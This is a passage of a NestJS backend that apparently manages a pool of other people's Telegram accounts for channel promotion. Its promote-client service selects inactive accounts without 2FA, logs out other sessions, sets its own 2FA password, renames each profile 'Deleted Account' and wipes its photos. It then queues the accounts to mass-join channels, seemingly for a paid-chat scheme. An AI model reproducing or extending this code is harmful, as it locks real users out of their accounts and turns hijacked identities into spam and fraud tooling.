'./schemas/promote-client.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { ChannelsModule } from '../channels/channels.module';\r\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: 'promoteClientModule', schema: PromoteClientSchema, collection: 'promoteClients' }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => UsersModule),\r\n    forwardRef(() => ActiveChannelsModule),\r\n    forwardRef(() => ClientModule),\r\n    forwardRef(() => ChannelsModule),\r\n    forwardRef(() => BufferClientModule),\r\n ],\r\n  controllers: [PromoteClientController],\r\n  providers: [PromoteClientService],\r\n  exports: [PromoteClientService]\r\n})\r\nexport class PromoteClientModule { }\r\n","import { ChannelsService } from '../channels/channels.service';\r\nimport { Channel } from '../channels/schemas/channel.schema';\r\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\r\nimport { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';\r\nimport { TelegramService } from '../Telegram/Telegram.service';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { UsersService } from '../users/users.service';\r\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\r\nimport { fetchWithTimeout, parseError, ppplbot } from '../../utils';\r\nimport { ClientService } from '../clients/client.service';\r\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\r\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\r\n\r\n@Injectable()\r\nexport class PromoteClientService {\r\n    private joinChannelMap: Map<string, Channel[]> = new Map();\r\n    private joinChannelIntervalId: NodeJS.Timeout;\r\n    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,\r\n        @Inject(forwardRef(() => TelegramService))\r\n        private telegramService: TelegramService,\r\n        @Inject(forwardRef(() => UsersService))\r\n        private usersService: UsersService,\r\n        @Inject(forwardRef(() => ActiveChannelsService))\r\n        private activeChannelsService: ActiveChannelsService,\r\n        @Inject(forwardRef(() => ClientService))\r\n        private clientService: ClientService,\r\n        @Inject(forwardRef(() => ActiveChannelsService))\r\n        private channelsService: ChannelsService,\r\n        @Inject(forwardRef(() => BufferClientService))\r\n        private bufferClientService: BufferClientService,\r\n    ) {}\r\n\r\n    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {\r\n        const newUser = new this.promoteClientModel(promoteClient);\r\n        return newUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<PromoteClient[]> {\r\n        return this.promoteClientModel.find().exec();\r\n    }\r\n\r\n    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {\r\n        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\r\n        if (!user && throwErr) {\r\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n\r\n    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\r\n        const updatedUser = await this.promoteClientModel.findOneAndUpdate(\r\n            { mobile },\r\n            { $set: updateClientDto },\r\n            { new: true, upsert: true, returnDocument: 'after' }\r\n        ).exec();\r\n\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\r\n        }\r\n\r\n        return updatedUser;\r\n    }\r\n\r\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {\r\n        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\r\n        if (existingUser) {\r\n            console.log(\"Updating\")\r\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);\r\n        } else {\r\n            console.log(\"creating\")\r\n            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);\r\n        }\r\n    }\r\n\r\n    async remove(mobile: string): Promise<void> {\r\n        await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);\r\n        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();\r\n        if (result.deletedCount === 0) {\r\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\r\n        }\r\n    }\r\n    async search(filter: any): Promise<PromoteClient[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.promoteClientModel.find(filter).exec();\r\n    }\r\n\r\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {\r\n        try {\r\n\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            const queryExec = this.promoteClientModel.find(query);\r\n            if (sort) {\r\n                queryExec.sort(sort);\r\n            }\r\n\r\n            if (limit) {\r\n                queryExec.limit(limit);\r\n            }\r\n\r\n            if (skip) {\r\n                queryExec.skip(skip);\r\n            }\r\n\r\n            return await queryExec.exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n\r\n    removeFromPromoteMap(key: string) {\r\n        this.joinChannelMap.delete(key)\r\n    }\r\n    clearPromoteMap() {\r\n        console.log(\"PromoteMap cleared\")\r\n        this.joinChannelMap.clear()\r\n    }\r\n\r\n    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {\r\n        if (!this.telegramService.getActiveClientSetup()) {\r\n            console.log(\"Joining Channel Started\");\r\n            this.clearJoinChannelInterval();\r\n            try {\r\n                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\r\n                await this.telegramService.disconnectAll();\r\n                await sleep(2000);\r\n                const clients = await this.promoteClientModel.find({ channels: { \"$lt\": 250 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\r\n\r\n                if (clients.length > 0) {\r\n                    for (const document of clients) {\r\n                        try {\r\n                            const client = await this.telegramService.createClient(document.mobile, false, false);\r\n                            console.log(\"Started Joining for : \", document.mobile);\r\n                            const channels = await client.channelInfo(true);\r\n                            console.log(\"Existing Channels Length : \", channels.ids.length);\r\n                            await this.update(document.mobile, { channels: channels.ids.length });\r\n\r\n                            let result = [];\r\n                            if (channels.canSendFalseCount < 50) {\r\n                                if (channels.ids.length < 220) {\r\n                                    result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\r\n                                } else {\r\n                                    result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\r\n                                }\r\n                                this.joinChannelMap.set(document.mobile, result);\r\n                            } else {\r\n                                await client.leaveChannels(channels.canSendFalseChats);\r\n                            }\r\n                            await this.telegramService.deleteClient(document.mobile);\r\n                        } catch (error) {\r\n                            const parsedError = parseError(error);\r\n                            console.error(`Error while joining channels for mobile: ${document.mobile}`, parsedError);\r\n                        }\r\n                    }\r\n\r\n                    this.joinChannelQueue();\r\n\r\n                }\r\n                console.log(\"Joining Channel Triggered Successfully for\", clients.length);\r\n                return `Initiated Joining channels for ${clients.length}`;\r\n            } catch (error) {\r\n                console.error(\"Error during the joinchannelForPromoteClients process: \", error);\r\n                throw new Error(\"Failed to initiate channel joining process\");\r\n            }\r\n        } else {\r\n            console.log(\"Ignored active check for promote channels as an active client setup exists\");\r\n            return \"Active client setup exists, skipping promotion\";\r\n        }\r\n    }\r\n\r\n    async joinChannelQueue() {\r\n        const existingkeys = Array.from(this.joinChannelMap.keys())\r\n        if (existingkeys.length > 0) {\r\n            this.joinChannelIntervalId = setInterval(async () => {\r\n                const keys = Array.from(this.joinChannelMap.keys());\r\n                if (keys.length > 0) {\r\n                    console.log(\"In JOIN CHANNEL interval: \", new Date().toISOString());\r\n                    for (const mobile of keys) {\r\n                        const channels = this.joinChannelMap.get(mobile);\r\n                        if (channels && channels.length > 0) {\r\n                            const channel = channels.shift();\r\n                            console.log(mobile, \" Pending Channels: \", channels.length);\r\n                            this.joinChannelMap.set(mobile, channels);\r\n\r\n                            try {\r\n                                await this.telegramService.createClient(mobile, false, false);\r\n                                console.log(mobile, \" Trying to join: \", channel.username);\r\n                                await this.telegramService.tryJoiningChannel(mobile, channel);\r\n                            } catch (error) {\r\n                                const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `);\r\n                                console.error(`${mobile} Error while joining @${channel.username}`, errorDetails);\r\n                                if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\r\n                                    console.log(`${mobile} has FloodWaitError or joined too many channels. Handling...`);\r\n                                    this.removeFromPromoteMap(mobile);\r\n                                    const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\r\n                                    // await this.update(mobile, { channels: channelsInfo.ids.length });\r\n                                }\r\n                            } finally {\r\n                                await this.telegramService.deleteClient(mobile);\r\n                            }\r\n                        } else {\r\n                            this.joinChannelMap.delete(mobile);\r\n                        }\r\n                    }\r\n                } else {\r\n                    this.clearJoinChannelInterval();\r\n                }\r\n            }, 4 * 60 * 1000);\r\n        }\r\n    }\r\n\r\n    clearJoinChannelInterval() {\r\n        if (this.joinChannelIntervalId) {\r\n            clearInterval(this.joinChannelIntervalId);\r\n            this.joinChannelIntervalId = null;\r\n            setTimeout(() => {\r\n                this.joinchannelForPromoteClients(false)\r\n            }, 30000);\r\n        }\r\n    }\r\n\r\n    async setAsPromoteClient(\r\n        mobile: string,\r\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\r\n    ) {\r\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\r\n        if (!user) {\r\n            throw new BadRequestException('user not found');\r\n        }\r\n        const isExist = await this.findOne(mobile, false)\r\n        if (isExist) {\r\n            throw new ConflictException('PromoteClient already exist');\r\n        }\r\n        const clients = await this.clientService.findAll();\r\n        const clientMobiles = clients.map(client => client?.mobile);\r\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\r\n        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {\r\n            const telegramClient = await this.telegramService.createClient(mobile, false)\r\n            try {\r\n                await telegramClient.set2fa();\r\n                await sleep(15000)\r\n                await telegramClient.updateUsername('');\r\n                await sleep(3000)\r\n                await telegramClient.updatePrivacyforDeletedAccount();\r\n                await sleep(3000)\r\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n                await sleep(3000)\r\n                await telegramClient.deleteProfilePhotos();\r\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\r\n                const promoteClient = {\r\n                    tgId: user.tgId,\r\n                    lastActive: \"default\",\r\n                    mobile: user.mobile,\r\n                    availableDate,\r\n                    channels: channels.ids.length,\r\n                }\r\n                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();\r\n            } catch (error) {\r\n                const errorDetails = parseError(error)\r\n                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\r\n            }\r\n            await this.telegramService.deleteClient(mobile)\r\n            return \"Client set as promote successfully\";\r\n        } else {\r\n            throw new BadRequestException(\"Number is a Active Client\")\r\n        }\r\n    }\r\n\r\n    async checkPromoteClients() {\r\n        if (!this.telegramService.getActiveClientSetup()) {\r\n            await this.telegramService.disconnectAll()\r\n            await sleep(2000);\r\n            const promoteclients = await this.findAll();\r\n            let goodIds: string[] = [];\r\n            let badIds: string[] = [];\r\n            if (promoteclients.length < 80) {\r\n                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {\r\n                    badIds.push(i.toString())\r\n                }\r\n            }\r\n            const clients = await this.clientService.findAll();\r\n            const bufferClients = await this.bufferClientService.findAll();\r\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\r\n            const bufferClientIds = bufferClients.map(client => client.mobile);\r\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\r\n            for (const document of promoteclients) {\r\n                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {\r\n                    try {\r\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\r\n                        const me = await cli.getMe();\r\n                        if (me.username) {\r\n                            await this.telegramService.updateUsername(document.mobile, '');\r\n                            await sleep(2000);\r\n                        }\r\n                        if (me.firstName !== \"Deleted Account\") {\r\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\r\n                            await sleep(2000);\r\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\r\n                        }\r\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\r\n                        const hasPassword = await cli.hasPassword();\r\n                        if (!hasPassword && badIds.length < 4) {\r\n                            console.log(\"Client does not have password\");\r\n                            badIds.push(document.mobile);\r\n                            // await this.remove(document.mobile);\r\n                        } else {\r\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\r\n                            // await this.promoteClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\r\n                            console.log(document.mobile, \" :  ALL Good\");\r\n                            goodIds.push(document.mobile)\r\n                        }\r\n                        await this.telegramService.removeOtherAuths(document.mobile);\r\n                        await sleep(2000);\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                    } catch (error) {\r\n                        parseError(error);\r\n                        badIds.push(document.mobile);\r\n                        this.remove(document.mobile);\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                    }\r\n                } else {\r\n                    console.log(\"Number is a Active Client\");\r\n                    goodIds.push(document.mobile)\r\n                    this.remove(document.mobile)\r\n                }\r\n            }\r\n            goodIds = [...goodIds, ...clientIds, ...bufferClientIds]\r\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\r\n            this.addNewUserstoPromoteClients(badIds, goodIds);\r\n        } else {\r\n            console.log(\"ignored active check promote channels as active client setup exists\")\r\n        }\r\n    }\r\n\r\n    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {\r\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\r\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\r\n        console.log(\"New promote documents to be added: \", documents.length)\r\n        while (badIds.length > 0 && documents.length > 0) {\r\n            const document = documents.shift();\r\n            try {\r\n                try {\r\n                    const client = await this.telegramService.createClient(document.mobile, false);\r\n                    const hasPassword = await client.hasPassword();\r\n                    console.log(\"hasPassword: \", hasPassword);\r\n                    if (!hasPassword) {\r\n                        await client.removeOtherAuths();\r\n                        await client.set2fa();\r\n                        console.log(\"waiting for setting 2FA\");\r\n                        await sleep(30000);\r\n                        await client.updateUsername('');\r\n                        await sleep(3000)\r\n                        await client.updatePrivacyforDeletedAccount();\r\n                        await sleep(3000)\r\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n                        await sleep(3000)\r\n                        await client.deleteProfilePhotos();\r\n                        const channels = await client.channelInfo(true)\r\n                        console.log(\"Inserting Document\");\r\n                        const promoteClient = {\r\n                            tgId: document.tgId,\r\n                            lastActive: \"today\",\r\n                            mobile: document.mobile,\r\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\r\n                            channels: channels.ids.length,\r\n                        }\r\n                        await this.create(promoteClient);\r\n                        await this.usersService.update(document.tgId, { twoFA: true })\r\n                        console.log(\"=============Created PromoteClient=============\")\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                        badIds.pop();\r\n                    } else {\r\n                        console.log(\"Failed to Update as PromoteClient has Password\");\r\n                        await this.usersService.update(document.tgId, { twoFA: true })\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                    }\r\n                } catch (error) {\r\n                    parseError(error)\r\n                    await this.telegramService.deleteClient(document.mobile)\r\n                }\r\n            } catch (error) {\r\n                parseError(error)\r\n                console.error(\"An error occurred:\", error);\r\n            }\r\n            await this.telegramService.deleteClient(document.mobile)\r\n        }\r\n        setTimeout(() => {\r\n            this.joinchannelForPromoteClients()\r\n        }, 2 * 60 * 1000);\r\n    }\r\n}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type PromoteClientDocument = PromoteClient & Document;\r\n@Schema({ collection: 'promoteClients', versionKey: false, autoIndex: true,\r\n  timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})  // Specify the collection name here\r\nexport class PromoteClient {\r\n  @Prop({ required: true})\r\n  tgId: string;\r\n\r\n  @Prop({ required: true, unique: true })\r\n  mobile: string;\r\n  \r\n  @Prop({ required: true })\r\n  lastActive: string;\r\n\r\n  @Prop({ required: true })\r\n  availableDate: string;\r\n\r\n  @Prop({ required: true, type: Number })\r\n  channels: number;\r\n}\r\n\r\nexport const PromoteClientSchema = SchemaFactory.createForClass(PromoteClient);\r\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { PromoteMsgsService } from './promote-msgs.service';\r\n\r\n@ApiTags('Promote-msgs')\r\n@Controller('promote-msgs')\r\nexport class PromoteMsgsController {\r\n  constructor(private readonly promoteMsgsService: PromoteMsgsService) {}\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get promote-msgs data' })\r\n  async findOne(): Promise<any>{\r\n    return this.promoteMsgsService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update promote-msgs' })\r\n  @ApiBody({type: Object})\r\n  async update( @Body() updateClientDto: any): Promise<any> {\r\n    return this.promoteMsgsService.update( updateClientDto);\r\n  }\r\n\r\n}\r\n","import { Module, Global } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { PromoteMsgsService } from './promote-msgs.service';\r\nimport { PromoteMsgsController } from './promote-msgs.controller';\r\nimport { PromoteMsgSchema } from './promote-msgs.schema';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    PromoteMsgModule,\r\n    MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: PromoteMsgSchema }]),\r\n  ],\r\n  providers: [PromoteMsgsService],\r\n  controllers: [PromoteMsgsController],\r\n  exports: [PromoteMsgsService],\r\n})\r\nexport class PromoteMsgModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose, { Document } from 'mongoose';\r\n\r\nexport type PromoteMsgDocument = PromoteMsg & Document;\r\n\r\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\r\n    toJSON: {\r\n      virtuals: true,\r\n      transform: (doc, ret) => {\r\n        delete ret._id;\r\n      },\r\n    },})\r\nexport class PromoteMsg {}\r\n\r\nexport const PromoteMsgSchema = SchemaFactory.createForClass(PromoteMsg);\r\nPromoteMsgSchema.add({ type: mongoose.Schema.Types.Mixed });\r\n\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { PromoteMsg } from './promote-msgs.schema';\r\n\r\n@Injectable()\r\nexport class PromoteMsgsService {\r\n    constructor(@InjectModel('promotemsgModule') private promotemsgModel: Model<PromoteMsg>) {\r\n    }\r\n\r\n    async OnModuleInit() {\r\n        console.log(\"Config Module Inited\")\r\n    }\r\n\r\n    async findOne(): Promise<any> {\r\n        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();\r\n        if (!user) {\r\n            throw new NotFoundException(`promotemsgModel not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n    async update(updateClientDto: any): Promise<any> {\r\n        delete updateClientDto['_id']\r\n        const updatedUser = await this.promotemsgModel.findOneAndUpdate(\r\n            {}, // Assuming you want to update the first document found in the collection\r\n            { $set: { ...updateClientDto } },\r\n            { new: true, upsert: true }\r\n        ).exec();\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`promotemsgModel not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n}\r\n","// create-promote-stat.dto.ts\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreatePromoteStatDto {\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\r\n  data: Map<string, number>;\r\n\r\n  @ApiProperty({ example: 552, description: 'Total Count' })\r\n  totalCount: number;\r\n\r\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\r\n  uniqueChannels: number;\r\n\r\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\r\n  releaseDay: number;\r\n\r\n  @ApiProperty({ example: 1719860106247.0, description: 'Last Updated TimeStamp' })\r\n  lastUpdatedTimeStamp: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Is Active' })\r\n  isActive: boolean;\r\n\r\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\r\n  channels: string[];\r\n}\r\n","// update-promote-stat.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreatePromoteStatDto } from './create-promote-stat.dto';\r\n\r\nexport class UpdatePromoteStatDto extends PartialType(CreatePromoteStatDto) {}\r\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\r\nimport { ApiTags } from '@nestjs/swagger';\r\nimport { PromoteStatService } from './promote-stat.service';\r\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\r\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\r\n\r\n@ApiTags('promote-stats')\r\n@Controller('promote-stats')\r\nexport class PromoteStatController {\r\n  constructor(private readonly promoteStatService: PromoteStatService) {}\r\n\r\n  @Post()\r\n  async create(@Body() createPromoteStatDto: CreatePromoteStatDto) {\r\n    return this.promoteStatService.create(createPromoteStatDto);\r\n  }\r\n\r\n  @Get(':client')\r\n  async findByClient(@Param('client') client: string) {\r\n    return this.promoteStatService.findByClient(client);\r\n  }\r\n\r\n  @Put(':client')\r\n  async update(\r\n    @Param('client') client: string,\r\n    @Body() updatePromoteStatDto: UpdatePromoteStatDto,\r\n  ) {\r\n    return this.promoteStatService.update(client, updatePromoteStatDto);\r\n  }\r\n\r\n  @Delete(':client')\r\n  async deleteOne(@Param('client') client: string) {\r\n    return this.promoteStatService.deleteOne(client);\r\n  }\r\n\r\n  @Delete()\r\n  async deleteAll() {\r\n    return this.promoteStatService.deleteAll();\r\n  }\r\n}\r\n","import { initModule } from './../ConfigurationInit/init.module';\r\nimport { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { PromoteStatService } from './promote-stat.service';\r\nimport { PromoteStatController } from './promote-stat.controller';\r\nimport { PromoteStat, PromoteStatSchema } from './schemas/promote-stat.schema';\r\nimport { ClientModule } from '../clients/client.module';\r\n\r\n@Module({\r\n  imports: [initModule,\r\n    MongooseModule.forFeature([{ name: PromoteStat.name, collection: \"promoteStats\", schema: PromoteStatSchema }]),\r\n    ClientModule\r\n  ],\r\n  controllers: [PromoteStatController],\r\n  providers: [PromoteStatService],\r\n  exports: [PromoteStatService]\r\n})\r\nexport class PromoteStatModule { }\r\n","import { Inject, Injectable, NotFoundException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\r\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\r\nimport { PromoteStat, PromoteStatDocument } from './schemas/promote-stat.schema';\r\nimport { ClientService } from '../clients/client.service';\r\n\r\n@Injectable()\r\nexport class PromoteStatService {\r\n  constructor(@InjectModel(PromoteStat.name) private promoteStatModel: Model<PromoteStatDocument>,\r\n    @Inject(forwardRef(() => ClientService))\r\n    private clientService: ClientService,) { }\r\n\r\n  async create(createPromoteStatDto: CreatePromoteStatDto): Promise<PromoteStat> {\r\n    const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);\r\n    return createdPromoteStat.save();\r\n  }\r\n\r\n  async findAll(): Promise<PromoteStat[]> {\r\n    const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();\r\n    return promoteStat;\r\n  }\r\n\r\n\r\n  async findByClient(client: string): Promise<PromoteStat> {\r\n    const promoteStat = await this.promoteStatModel.findOne({ client }).exec()\r\n    if (!promoteStat) {\r\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\r\n    }\r\n    return promoteStat;\r\n  }\r\n\r\n  async update(client: string, updatePromoteStatDto: UpdatePromoteStatDto): Promise<PromoteStat> {\r\n    const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();\r\n    if (!promoteStat) {\r\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\r\n    }\r\n    return promoteStat;\r\n  }\r\n\r\n  async deleteOne(client: string): Promise<void> {\r\n    const result = await this.promoteStatModel.deleteOne({ client }).exec();\r\n    if (result.deletedCount === 0) {\r\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\r\n    }\r\n  }\r\n\r\n  async deleteAll(): Promise<void> {\r\n    await this.promoteStatModel.deleteMany({}).exec();\r\n  }\r\n\r\n  async reinitPromoteStats() {\r\n    const users = await this.findAll()\r\n    for (const user of users) {\r\n      await this.promoteStatModel.updateOne({ client: user.client },\r\n        {\r\n          $set: {\r\n            totalCount: 0,\r\n            uniqueChannels: 0,\r\n            releaseDay: Date.now(),\r\n            lastUpdatedTimeStamp: Date.now(),\r\n            data: {}//Object.fromEntries((await this.promoteStatModel.findOne({ client: user.client })).channels?.map(channel => [channel, 0])),\r\n          }\r\n        }\r\n      );\r\n    }\r\n  }\r\n}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type PromoteStatDocument = PromoteStat & Document;\r\n\r\n@Schema()\r\nexport class PromoteStat {\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\r\n  @Prop({ required: true, unique: true })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\r\n  @Prop({ required: true, type: Map, of: Number })\r\n  data: Map<string, number>;\r\n\r\n  @ApiProperty({ example: 552, description: 'Total Count' })\r\n  @Prop({ required: true })\r\n  totalCount: number;\r\n\r\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\r\n  @Prop({ required: true })\r\n  uniqueChannels: number;\r\n\r\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\r\n  @Prop({ required: true })\r\n  releaseDay: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Is Active' })\r\n  @Prop({ required: true })\r\n  isActive: boolean;\r\n\r\n  @ApiProperty({ example: 1719929752982.0, description: 'Last Updated TimeStamp' })\r\n  @Prop({ required: true })\r\n  lastUpdatedTimeStamp: number;\r\n\r\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\r\n  @Prop({ required: true, type: [String] })\r\n  channels: string[];\r\n}\r\n\r\nexport const PromoteStatSchema = SchemaFactory.createForClass(PromoteStat);\r\n","// create-stat.dto.ts\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateStatDto {\r\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ example: 12, description: 'Count' })\r\n  count: number;\r\n\r\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\r\n  payAmount: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given' })\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\r\n  demoGivenToday: boolean;\r\n\r\n  @ApiProperty({ example: false, description: 'New User' })\r\n  newUser: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Paid Reply' })\r\n  paidReply: boolean;\r\n\r\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\r\n  name: string;\r\n\r\n  @ApiProperty({ example: false, description: 'Second Show' })\r\n  secondShow: boolean;\r\n\r\n  @ApiProperty({ example: null, description: 'Did Pay' })\r\n  didPay: boolean | null;\r\n\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\r\n  profile: string;\r\n}\r\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\r\nimport { ApiTags } from '@nestjs/swagger';\r\nimport { Stat2Service } from './stat2.service';\r\nimport { CreateStatDto } from './create-stat2.dto';\r\nimport { UpdateStatDto } from './update-stat2.dto';\r\n\r\n@ApiTags('stats2')\r\n@Controller('stats2')\r\nexport class Stat2Controller {\r\n  constructor(private readonly statService: Stat2Service) {}\r\n\r\n  @Post()\r\n  async create(@Body() createStatDto: CreateStatDto) {\r\n    return 